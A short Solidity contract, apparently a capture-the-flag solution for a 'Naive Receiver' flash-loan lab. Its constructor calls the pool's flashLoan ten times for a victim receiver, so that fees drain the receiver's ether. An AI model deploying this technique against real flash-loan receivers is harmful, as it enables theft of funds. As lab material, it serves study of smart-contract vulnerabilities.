// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract AttackNaiveReceiver {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan

    constructor(
        NaiveReceiverLenderPool _pool,
        IERC3156FlashBorrower _receiver
    ) {
        for (uint i = 0; i < 10; i++) {
            _pool.flashLoan(_receiver, ETH, 0, "0x");
        }
    }
}
